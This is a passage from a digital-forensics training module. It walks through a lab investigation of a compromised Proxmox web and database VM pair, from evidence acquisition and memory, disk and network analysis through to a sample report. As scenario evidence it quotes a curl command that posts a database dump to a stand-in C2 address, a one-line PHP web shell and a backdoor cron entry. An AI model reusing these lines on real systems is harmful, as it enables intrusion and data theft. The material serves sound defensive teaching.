   - How a VM's memory dump represents the VM's state at a point in time
   - How snapshot delta chains preserve historical state
   - Why a forensic copy of a virtual disk is functionally identical to the original
   - The limitations of the analysis (what evidence was unavailable or potentially modified)

### 9.6 Expert Witness Considerations

Common challenges to virtual evidence in court:

- **"The copy is not the original"** — counter with hash verification and toolchain validation. The copy is a bit-for-bit reproduction.
- **"The hypervisor could have modified the evidence"** — counter with hypervisor integrity verification (measured boot, TPM attestation if available) and separation of concerns (the hypervisor does not modify guest data during acquisition).
- **"The timestamps are unreliable"** — counter with NTP verification, hypervisor clock correlation, and documentation of any observed time skew.
- **"The volatile evidence was contaminated"** — counter with documentation of the acquisition methodology, noting that any acquisition of volatile evidence inherently modifies the system state minimally (CPU cycles, memory pages used by the acquisition tool), and that this is an accepted limitation of digital forensics documented in RFC 3227 and NIST SP 800-86.

---

## 10. Lab: Complete Virtual Forensics Investigation

### 10.1 Scenario

A production Proxmox VE cluster (three nodes: `pve-node1`, `pve-node2`, `pve-node3`) hosts a web application across multiple VMs. The SOC has detected anomalous outbound traffic from VM 100 (`webserver-prod`, running Debian 12, on `pve-node1`). Initial triage suggests a compromised web server with potential lateral movement to VM 101 (`db-prod`, running Debian 12, on `pve-node2`). The investigation must:

1. Acquire memory, disk, network, and log evidence from both VMs
2. Perform timeline analysis
3. Identify Indicators of Compromise (IOCs)
4. Trace lateral movement
5. Document findings in a forensic report
6. Maintain chain of custody throughout

### 10.2 Phase 1 — Immediate Containment and Evidence Preservation

**Step 1: Document the initial state**

```bash
# Record current time (all timestamps in UTC)
date -u +%Y-%m-%dT%H:%M:%SZ
# 2026-03-01T22:28:00Z

# Document VM state
qm status 100
qm status 101

# Document network configuration
qm config 100 | grep net
qm config 101 | grep net

# Record hypervisor uptime and load
uptime
cat /proc/loadavg
```

**Step 2: Memory acquisition (Priority 1)**

```bash
# VM 100 memory dump — on pve-node1
qm monitor 100 <<'EOF'
dump-guest-memory -p /evidence/case-IR2026-0042/vm100-mem.elf
EOF

# Hash immediately
sha256sum /evidence/case-IR2026-0042/vm100-mem.elf | tee \
  /evidence/case-IR2026-0042/vm100-mem.elf.sha256
# Record: 2026-03-01T22:30:00Z  VE-001  SHA-256: <hash>

# VM 101 memory dump — on pve-node2
ssh pve-node2 'qm monitor 101' <<'EOF'
dump-guest-memory -p /evidence/case-IR2026-0042/vm101-mem.elf
EOF

sha256sum /evidence/case-IR2026-0042/vm101-mem.elf | tee \
  /evidence/case-IR2026-0042/vm101-mem.elf.sha256
# Record: 2026-03-01T22:32:00Z  VE-002  SHA-256: <hash>
```

**Step 3: Network capture (Priority 2)**

```bash
# Start packet capture on VM 100's tap interface
tcpdump -i tap100i0 -w /evidence/case-IR2026-0042/vm100-network.pcap &
TCPDUMP_PID=$!
echo "tcpdump PID: ${TCPDUMP_PID}, started 2026-03-01T22:33:00Z"

# Capture VM 101's traffic
ssh pve-node2 "tcpdump -i tap101i0 -w /tmp/vm101-network.pcap" &
```

**Step 4: Snapshot (memory-inclusive)**

```bash
# Snapshot VM 100 (includes memory state and disk)
qm snapshot 100 forensic-hold-$(date -u +%Y%m%dT%H%M%SZ) \
  --description "IR-2026-0042 forensic hold. Examiner: [Name]. Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

# Snapshot VM 101
ssh pve-node2 "qm snapshot 101 forensic-hold-$(date -u +%Y%m%dT%H%M%SZ) \
  --description 'IR-2026-0042 forensic hold'"
```

**Step 5: Network containment**

```bash
# Isolate VM 100 — move to quarantine bridge
qm set 100 -net0 virtio,bridge=vmbr_quarantine

# Isolate VM 101
ssh pve-node2 "qm set 101 -net0 virtio,bridge=vmbr_quarantine"
```

**Step 6: Disk image acquisition (Priority 5)**

```bash
# Copy VM 100 disk image (read-only, do not use qm move)
cp --reflink=auto /var/lib/vz/images/100/vm-100-disk-0.qcow2 \
  /evidence/case-IR2026-0042/vm100-disk.qcow2

sha256sum /evidence/case-IR2026-0042/vm100-disk.qcow2 | tee \
  /evidence/case-IR2026-0042/vm100-disk.qcow2.sha256

# Copy VM 101 disk from pve-node2
scp pve-node2:/var/lib/vz/images/101/vm-101-disk-0.qcow2 \
  /evidence/case-IR2026-0042/vm101-disk.qcow2

sha256sum /evidence/case-IR2026-0042/vm101-disk.qcow2 | tee \
  /evidence/case-IR2026-0042/vm101-disk.qcow2.sha256
```

**Step 7: Log preservation (Priority 6)**

```bash
# Export relevant journal entries
journalctl --since "2026-02-15" --output export > \
  /evidence/case-IR2026-0042/pve-node1-journal.export

ssh pve-node2 "journalctl --since '2026-02-15' --output export" > \
  /evidence/case-IR2026-0042/pve-node2-journal.export

# Copy specific log files
cp /var/log/pve-firewall.log /evidence/case-IR2026-0042/
cp /var/log/auth.log /evidence/case-IR2026-0042/pve-node1-auth.log

# Copy VM configurations
cp /etc/pve/qemu-server/100.conf /evidence/case-IR2026-0042/
cp /etc/pve/qemu-server/101.conf /evidence/case-IR2026-0042/

# Copy task logs
cp -r /var/log/pve/tasks/ /evidence/case-IR2026-0042/pve-tasks/

# Hash all collected evidence
find /evidence/case-IR2026-0042/ -type f ! -name "*.sha256" -exec sha256sum {} \; > \
  /evidence/case-IR2026-0042/evidence-manifest.sha256
```

### 10.3 Phase 2 — Memory Analysis

```bash
# VM 100 — Process listing
vol -f /evidence/case-IR2026-0042/vm100-mem.elf linux.pslist.PsList > \
  /evidence/case-IR2026-0042/analysis/vm100-pslist.txt

# Look for suspicious processes
vol -f /evidence/case-IR2026-0042/vm100-mem.elf linux.malfind.Malfind > \
  /evidence/case-IR2026-0042/analysis/vm100-malfind.txt

# Network connections — identify C2 communication
vol -f /evidence/case-IR2026-0042/vm100-mem.elf linux.sockstat.Sockstat > \
  /evidence/case-IR2026-0042/analysis/vm100-sockstat.txt

# Bash history — attacker commands
vol -f /evidence/case-IR2026-0042/vm100-mem.elf linux.bash.Bash > \
  /evidence/case-IR2026-0042/analysis/vm100-bash.txt

# Check for rootkit indicators
vol -f /evidence/case-IR2026-0042/vm100-mem.elf linux.check_syscall.Check_syscall > \
  /evidence/case-IR2026-0042/analysis/vm100-syscall-check.txt

vol -f /evidence/case-IR2026-0042/vm100-mem.elf linux.check_modules.Check_modules > \
  /evidence/case-IR2026-0042/analysis/vm100-modules-check.txt

# YARA scan for known malware signatures
vol -f /evidence/case-IR2026-0042/vm100-mem.elf yarascan.YaraScan \
  --yara-file /opt/yara-rules/malware_index.yar > \
  /evidence/case-IR2026-0042/analysis/vm100-yara.txt

# VM 101 — repeat analysis
vol -f /evidence/case-IR2026-0042/vm101-mem.elf linux.pslist.PsList > \
  /evidence/case-IR2026-0042/analysis/vm101-pslist.txt

vol -f /evidence/case-IR2026-0042/vm101-mem.elf linux.malfind.Malfind > \
  /evidence/case-IR2026-0042/analysis/vm101-malfind.txt

vol -f /evidence/case-IR2026-0042/vm101-mem.elf linux.sockstat.Sockstat > \
  /evidence/case-IR2026-0042/analysis/vm101-sockstat.txt
```

**Expected findings (scenario):**
- VM 100: suspicious process `/tmp/bc` (backdoor), outbound connection to `198.51.100.77:4444` (reverse shell C2), modified `/usr/bin/sshd` (trojaned binary)
- VM 101: SSH connection from VM 100's IP (`192.168.1.100`), unusual process accessing database files

### 10.4 Phase 3 — Disk Image Analysis

```bash
# Mount VM 100 disk read-only
mkdir -p /mnt/forensic/vm100
guestmount -a /evidence/case-IR2026-0042/vm100-disk.qcow2 -i --ro /mnt/forensic/vm100

# Generate filesystem timeline
find /mnt/forensic/vm100 -xdev -printf '%T+ %m %u %g %s %p\n' 2>/dev/null | \
  sort > /evidence/case-IR2026-0042/analysis/vm100-timeline.txt

# Examine suspicious files
sha256sum /mnt/forensic/vm100/tmp/bc
file /mnt/forensic/vm100/tmp/bc
strings /mnt/forensic/vm100/tmp/bc | head -50

# Check for persistence mechanisms
cat /mnt/forensic/vm100/etc/crontab
ls -la /mnt/forensic/vm100/etc/cron.d/
cat /mnt/forensic/vm100/etc/systemd/system/*.service 2>/dev/null
find /mnt/forensic/vm100 -name "*.service" -newer /mnt/forensic/vm100/etc/os-release

# Check SSH authorized_keys
find /mnt/forensic/vm100 -name "authorized_keys" -exec cat {} \;

# Check web server logs (attack vector identification)
ls -la /mnt/forensic/vm100/var/log/apache2/ 2>/dev/null
ls -la /mnt/forensic/vm100/var/log/nginx/ 2>/dev/null
grep -r "cmd\|exec\|system\|passthru\|shell_exec\|eval" \
  /mnt/forensic/vm100/var/www/ 2>/dev/null | head -50

# Check for web shells
find /mnt/forensic/vm100/var/www/ -name "*.php" -newer \
  /mnt/forensic/vm100/var/www/index.* -exec sha256sum {} \;

# Check auth logs on the guest
cat /mnt/forensic/vm100/var/log/auth.log | \
  grep -i "accepted\|failed\|invalid" | tail -50

# Examine /tmp and /dev/shm for attacker tools
find /mnt/forensic/vm100/tmp/ -type f -ls
find /mnt/forensic/vm100/dev/shm/ -type f -ls

# Unmount
guestunmount /mnt/forensic/vm100
```

### 10.5 Phase 4 — Network Analysis

```bash
# Stop capture (after sufficient collection period)
kill $TCPDUMP_PID

# Analyze captured traffic
# Top talkers
tshark -r /evidence/case-IR2026-0042/vm100-network.pcap -q -z conv,ip

# DNS queries (potential C2 domain identification)
tshark -r /evidence/case-IR2026-0042/vm100-network.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -30

# HTTP requests
tshark -r /evidence/case-IR2026-0042/vm100-network.pcap -Y "http.request" \
  -T fields -e ip.dst -e http.host -e http.request.uri | head -50

# Connections to known C2 IP
tshark -r /evidence/case-IR2026-0042/vm100-network.pcap -Y "ip.addr == 198.51.100.77"

# Extract files from HTTP streams
tshark -r /evidence/case-IR2026-0042/vm100-network.pcap \
  --export-objects http,/evidence/case-IR2026-0042/analysis/http-objects/

# Inter-VM traffic (lateral movement indicator)
tshark -r /evidence/case-IR2026-0042/vm100-network.pcap \
  -Y "ip.dst == 192.168.1.101" -T fields -e frame.time -e tcp.dstport | head -30
```

### 10.6 Phase 5 — Log Correlation and Timeline

```bash
#!/bin/bash
# build_unified_timeline.sh — Merge all evidence sources into one timeline
# All timestamps must be UTC ISO 8601

CASE_DIR="/evidence/case-IR2026-0042"
TIMELINE="${CASE_DIR}/analysis/unified-timeline.csv"

echo "timestamp_utc,source,event_type,detail" > "$TIMELINE"

# Hypervisor auth events
journalctl -t sshd --since "2026-02-15" --output short-iso --no-pager | \
  while IFS= read -r line; do
    ts=$(echo "$line" | awk '{print $1}')
    echo "${ts},hypervisor-auth,authentication,${line}" >> "$TIMELINE"
  done

# VM lifecycle events
journalctl -u pvedaemon --since "2026-02-15" --no-pager | \
  grep -iE "VM 100|VM 101|snapshot|migrate|clone" | \
  while IFS= read -r line; do
    ts=$(echo "$line" | awk '{print $1, $2, $3}')
    echo "${ts},hypervisor-lifecycle,vm-event,${line}" >> "$TIMELINE"
  done

# Guest auth.log entries (from mounted disk)
if [ -f "${CASE_DIR}/extracted-logs/auth.log" ]; then
  while IFS= read -r line; do
    ts=$(echo "$line" | awk '{print $1, $2, $3}')
    echo "${ts},guest-vm100-auth,authentication,${line}" >> "$TIMELINE"
  done < "${CASE_DIR}/extracted-logs/auth.log"
fi

# Network events (from pcap analysis)
tshark -r "${CASE_DIR}/vm100-network.pcap" \
  -Y "ip.addr == 198.51.100.77" \
  -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null | \
  while IFS=$'\t' read -r ts src dst port; do
    echo "${ts},network-capture,c2-communication,${src} -> ${dst}:${port}" >> "$TIMELINE"
  done

# Sort the unified timeline
sort -t',' -k1 "$TIMELINE" -o "$TIMELINE"

echo "Unified timeline generated: $(wc -l < "$TIMELINE") entries"
```

### 10.7 Phase 6 — IOC Identification

Based on the analysis, compile the IOC list:

```
+------------------------------------------------------------------+
| INDICATORS OF COMPROMISE — IR-2026-0042                           |
+------------------------------------------------------------------+
|                                                                  |
| FILE-BASED IOCs:                                                 |
| SHA-256  : a1b2c3...  /tmp/bc              (reverse shell ELF)  |
| SHA-256  : d4e5f6...  /usr/bin/sshd         (trojaned sshd)     |
| SHA-256  : g7h8i9...  /var/www/html/x.php   (web shell)         |
| SHA-256  : j0k1l2...  /etc/cron.d/update    (persistence cron)  |
|                                                                  |
| NETWORK IOCs:                                                    |
| IP       : 198.51.100.77                    (C2 server)          |
| IP       : 203.0.113.42                     (initial scanner)    |
| Domain   : update.evil-domain.example       (C2 domain)         |
| Port     : 4444/tcp                         (reverse shell)     |
| Port     : 8443/tcp                         (HTTPS C2)          |
|                                                                  |
| BEHAVIORAL IOCs:                                                 |
| Cron job : */5 * * * * /tmp/bc -c 198.51.100.77:4444           |
| SSH key  : ssh-rsa AAAA...  attacker@kali  (unauthorized key)  |
| Web shell: POST to /x.php with cmd= parameter                  |
|                                                                  |
| MITRE ATT&CK MAPPING:                                           |
| T1190  Exploit Public-Facing Application    (initial access)    |
| T1505.003  Web Shell                         (persistence)       |
| T1059.004  Unix Shell                        (execution)         |
| T1053.003  Cron                              (persistence)       |
| T1098.004  SSH Authorized Keys               (persistence)       |
| T1021.004  SSH                               (lateral movement)  |
| T1041  Exfiltration Over C2 Channel          (exfiltration)      |
| T1070.002  Clear Linux Logs                  (defense evasion)   |
+------------------------------------------------------------------+
```

### 10.8 Phase 7 — Lateral Movement Tracing

```bash
# Evidence of lateral movement from VM 100 to VM 101:

# 1. VM 100 bash history shows SSH to VM 101
# From vm100-bash.txt (Volatility output):
# root@webserver:~$ ssh root@192.168.1.101
# root@webserver:~$ scp /tmp/bc root@192.168.1.101:/tmp/

# 2. VM 101 auth.log confirms incoming SSH
# From vm101 guest disk:
# Mar  1 22:19:30 db-prod sshd[1234]: Accepted publickey for root from 192.168.1.100

# 3. Network capture confirms the connection
# tshark output: 192.168.1.100 -> 192.168.1.101 TCP 22 [SYN] at 22:19:29Z

# 4. VM 101 disk shows /tmp/bc with same SHA-256 as on VM 100
# The attacker used the same backdoor tool on both machines

# 5. VM 101 shows database access
# From vm101 memory analysis:
# Process: /tmp/bc connecting to localhost:5432 (PostgreSQL)
# Bash history: pg_dump production_db > /tmp/dump.sql
# Bash history: curl -X POST -d @/tmp/dump.sql http://198.51.100.77:8443/exfil
```

### 10.9 Phase 8 — Forensic Report

```
+===================================================================+
|                    FORENSIC INVESTIGATION REPORT                    |
+===================================================================+

REPORT ID:        FR-2026-0042
CASE NUMBER:      IR-2026-0042
CLASSIFICATION:   CONFIDENTIAL
DATE:             2026-03-05
EXAMINER:         [Full Name], [Title], [Certification]
ORGANIZATION:     [Organization Name]

+-------------------------------------------------------------------+
| 1. EXECUTIVE SUMMARY                                               |
+-------------------------------------------------------------------+

On 2026-03-01, the SOC detected anomalous outbound network traffic
from VM 100 (webserver-prod) in the production Proxmox VE cluster.
Investigation revealed that an external attacker exploited a
vulnerability in the web application to deploy a web shell, escalated
to a reverse shell backdoor, and laterally moved to VM 101 (db-prod)
via SSH, ultimately exfiltrating the production database to an
external C2 server.

The initial compromise occurred on or about 2026-02-28 via a PHP
file upload vulnerability. The attacker maintained persistence
through a cron job, authorized SSH key, and trojaned sshd binary.
Lateral movement occurred on 2026-03-01 at approximately 22:19 UTC.
Database exfiltration was confirmed via HTTP POST to the C2 server.

+-------------------------------------------------------------------+
| 2. SCOPE AND AUTHORIZATION                                         |
+-------------------------------------------------------------------+

Authorization: [Reference to authorization document]
Scope:
  - VM 100 (webserver-prod) on pve-node1
  - VM 101 (db-prod) on pve-node2
  - Proxmox hypervisor logs on pve-node1 and pve-node2
  - Network traffic on vmbr0 bridge interfaces
  - Timeframe: 2026-02-15 to 2026-03-02

Out of scope:
  - Physical host forensics (no host compromise indicators found)
  - Other VMs in the cluster (no lateral movement indicators)
  - External infrastructure (C2 server)

+-------------------------------------------------------------------+
| 3. METHODOLOGY                                                     |
+-------------------------------------------------------------------+

Evidence acquisition followed RFC 3227 order of volatility adapted
for virtual environments (see Section 9.2 of this module).

Tools used:
  - QEMU 8.2.2 (memory acquisition via QMP dump-guest-memory)
  - tcpdump 4.99.4 (network capture)
  - libguestfs 1.52.0 (disk image mounting, read-only)
  - Volatility 3 framework 2.5.0 (memory analysis)
  - The Sleuth Kit 4.12.1 (filesystem analysis)
  - tshark 4.2.3 (network analysis)
  - sha256sum (GNU coreutils 9.4) (hash verification)

All evidence was acquired in read-only mode. Hash verification was
performed at acquisition time, after each transfer, and before
analysis. Chain of custody was maintained per organizational
procedures.

+-------------------------------------------------------------------+
| 4. EVIDENCE INVENTORY                                              |
+-------------------------------------------------------------------+

| ID    | Description            | Source     | SHA-256         | Acq Time (UTC)       | Examiner |
|-------|------------------------|------------|-----------------|----------------------|----------|
| VE-001| VM 100 memory dump     | pve-node1  | a1b2c3d4...     | 2026-03-01T22:30:00Z | [Name]   |
| VE-002| VM 101 memory dump     | pve-node2  | e5f6a7b8...     | 2026-03-01T22:32:00Z | [Name]   |
| VE-003| VM 100 disk image      | pve-node1  | c9d0e1f2...     | 2026-03-01T22:40:00Z | [Name]   |
| VE-004| VM 101 disk image      | pve-node2  | a3b4c5d6...     | 2026-03-01T22:50:00Z | [Name]   |
| VE-005| VM 100 network capture | pve-node1  | e7f8a9b0...     | 2026-03-01T22:33:00Z | [Name]   |
| VE-006| pve-node1 journal      | pve-node1  | c1d2e3f4...     | 2026-03-01T23:00:00Z | [Name]   |
| VE-007| pve-node2 journal      | pve-node2  | a5b6c7d8...     | 2026-03-01T23:05:00Z | [Name]   |

+-------------------------------------------------------------------+
| 5. CHAIN OF CUSTODY LOG                                            |
+-------------------------------------------------------------------+

[See Section 9.4 template — one entry per evidence item transfer]

+-------------------------------------------------------------------+
| 6. FINDINGS                                                        |
+-------------------------------------------------------------------+

FINDING 1: Web Application Exploitation (CRITICAL)
  CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
  CWE: CWE-434 (Unrestricted Upload of File with Dangerous Type)
  ATT&CK: T1190 (Exploit Public-Facing Application)
  Evidence: Web shell /var/www/html/x.php (VE-003)
  Timeline: On or about 2026-02-28, attacker uploaded a PHP web
  shell via the application's file upload functionality.
  PoC: POST /upload.php with Content-Type: multipart/form-data
  containing x.php with <?php system($_POST['cmd']); ?>
  Remediation: Patch the upload handler to validate file types,
  implement allowlist for permitted extensions, deploy WAF rules.

FINDING 2: Persistent Backdoor Installation (CRITICAL)
  CVSS: 9.1
  CWE: CWE-506 (Embedded Malicious Code)
  ATT&CK: T1059.004 (Unix Shell), T1053.003 (Cron)
  Evidence: /tmp/bc binary (VE-001, VE-003), cron entry (VE-003)
  Timeline: 2026-03-01T22:19:02Z — ELF binary deployed.
  Remediation: Remove malware, rebuild from known-good image.

FINDING 3: Lateral Movement via SSH (HIGH)
  CVSS: 8.1
  CWE: CWE-284 (Improper Access Control)
  ATT&CK: T1021.004 (SSH), T1098.004 (SSH Authorized Keys)
  Evidence: SSH connection logs (VE-001, VE-002, VE-005)
  Timeline: 2026-03-01T22:19:30Z — SSH from VM 100 to VM 101.
  Remediation: Implement network segmentation between web and
  database tiers, remove unauthorized SSH keys, enforce MFA.

FINDING 4: Database Exfiltration (CRITICAL)
  CVSS: 9.0
  CWE: CWE-200 (Exposure of Sensitive Information)
  ATT&CK: T1041 (Exfiltration Over C2 Channel)
  Evidence: Bash history (VE-002), network capture (VE-005)
  Timeline: 2026-03-01T22:22:00Z — pg_dump and curl exfil.
  Remediation: Revoke compromised credentials, notify affected
  users per breach notification requirements, implement DLP.

+-------------------------------------------------------------------+
| 7. ATTACK TIMELINE (UTC)                                           |
+-------------------------------------------------------------------+

2026-02-28T~14:00Z  Initial compromise — web shell uploaded
2026-02-28T~14:05Z  Web shell tested — whoami, id commands
2026-03-01T22:18:01Z  SSH brute force from 198.51.100.77 begins
2026-03-01T22:18:44Z  SSH root login succeeds (weak password)
2026-03-01T22:19:02Z  /tmp/bc (backdoor) deployed on VM 100
2026-03-01T22:19:15Z  Cron persistence established on VM 100
2026-03-01T22:19:25Z  SSH key added to /root/.ssh/authorized_keys
2026-03-01T22:19:30Z  Lateral movement — SSH from VM 100 to VM 101
2026-03-01T22:20:00Z  /tmp/bc deployed on VM 101
2026-03-01T22:21:00Z  pg_dump executed on VM 101
2026-03-01T22:22:00Z  Database exfiltrated via HTTP POST to C2
2026-03-01T22:25:00Z  Attacker deleted bash history on both VMs
2026-03-01T22:28:00Z  SOC alert triggered, investigation begins

+-------------------------------------------------------------------+
| 8. MITRE ATT&CK MAPPING                                           |
+-------------------------------------------------------------------+

| Tactic             | Technique                      | ID         |
|--------------------|--------------------------------|------------|
| Initial Access     | Exploit Public-Facing App      | T1190      |
| Execution          | Unix Shell                     | T1059.004  |
| Persistence        | Web Shell                      | T1505.003  |
| Persistence        | Cron                           | T1053.003  |
| Persistence        | SSH Authorized Keys            | T1098.004  |
| Defense Evasion    | Clear Linux Logs               | T1070.002  |
| Defense Evasion    | Clear Command History          | T1070.003  |
| Credential Access  | Brute Force                    | T1110      |
| Lateral Movement   | SSH                            | T1021.004  |
| Collection         | Data from Local System         | T1005      |
| Exfiltration       | Exfiltration Over C2 Channel   | T1041      |

+-------------------------------------------------------------------+
| 9. RECOMMENDATIONS                                                 |
+-------------------------------------------------------------------+

IMMEDIATE (0-24 hours):
1. Rebuild VM 100 and VM 101 from known-good images
2. Rotate all credentials (SSH keys, database passwords, API keys)
3. Block C2 IP (198.51.100.77) at perimeter firewall
4. Deploy IOC signatures to IDS/IPS
5. Notify affected data subjects per GDPR Art. 34 / applicable law

SHORT-TERM (1-7 days):
6. Patch the web application file upload vulnerability
7. Implement network segmentation (web tier / db tier / mgmt)
8. Deploy WAF with file upload inspection rules
9. Enable comprehensive logging with WORM-capable remote storage
10. Implement SSH key management (no password auth, MFA required)

LONG-TERM (1-3 months):
11. Conduct full security assessment of the web application
12. Implement vulnerability scanning (weekly, authenticated)
13. Deploy EDR agents on all production VMs
14. Establish forensic readiness program:
    - Pre-deployed acquisition tools
    - Documented acquisition procedures
    - Regular forensic drills
15. Review and harden Proxmox cluster security posture per module 12

+-------------------------------------------------------------------+
| 10. APPENDICES                                                     |
+-------------------------------------------------------------------+

Appendix A: Full command log (all forensic commands executed)
Appendix B: Tool versions and configurations
Appendix C: Complete IOC list (STIX format)
Appendix D: Raw evidence file listing with hashes
Appendix E: Network capture statistics
Appendix F: Volatility plugin output (full)
Appendix G: Filesystem timeline (full)
Appendix H: Chain of custody forms (signed originals)

+===================================================================+
| END OF REPORT                                                      |
+===================================================================+
```

---

## Key Takeaways

1. **Volatile evidence first** — always acquire VM memory before any other action. Memory contains running processes, network connections, encryption keys, and evidence of fileless malware that is permanently lost on power-off.

2. **Snapshots are your forensic friend** — a memory-inclusive snapshot provides an atomic point-in-time capture of both memory and disk state with minimal production impact. Take one before containment actions.

3. **Hypervisor is a powerful vantage point** — the hypervisor sits below the guest OS. It can acquire guest memory without guest cooperation, capture network traffic transparently, and provide VM lifecycle metadata that the guest cannot tamper with.

4. **Anti-forensics is different in VMs** — thin provisioning with TRIM, snapshot deletion, and VM-aware malware create anti-forensic vectors that do not exist in physical environments. Plan your forensic readiness accordingly.

5. **Chain of custody is paramount** — virtual evidence is trivially copyable and modifiable. Rigorous hashing (SHA-256), timestamp documentation (UTC ISO 8601), and transfer logging are non-negotiable for legal defensibility.

6. **Correlate across layers** — the most powerful forensic insights come from correlating guest evidence (disk, memory), hypervisor evidence (logs, VM lifecycle), and network evidence (captures, flows) into a unified timeline.

7. **Prepare before the incident** — forensic readiness (pre-deployed tools, documented procedures, centralized logging, practiced drills) dramatically reduces evidence loss and response time during an actual incident.

---

## References and Further Reading

- NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response
- NIST SP 800-61r3: Computer Security Incident Handling Guide
- RFC 3227: Guidelines for Evidence Collection and Archiving
- MITRE ATT&CK Framework: https://attack.mitre.org/
- Volatility 3 Documentation: https://volatility3.readthedocs.io/
- libguestfs Documentation: https://libguestfs.org/
- QEMU QMP Reference: https://www.qemu.org/docs/master/interop/qemu-qmp-ref.html
- The Sleuth Kit: https://sleuthkit.org/
- qcow2 Specification: https://github.com/qemu/qemu/blob/master/docs/interop/qcow2.txt
- VMDK Specification: VMware Virtual Disk Format Technical Note (vmware.com)
- Budapest Convention on Cybercrime and Second Additional Protocol
- EU NIS2 Directive 2022/2555
- US CLOUD Act (2018)
- GDPR Articles 34, 48, 49 — breach notification and international transfers
- FIRST DFIR Framework: https://www.first.org/
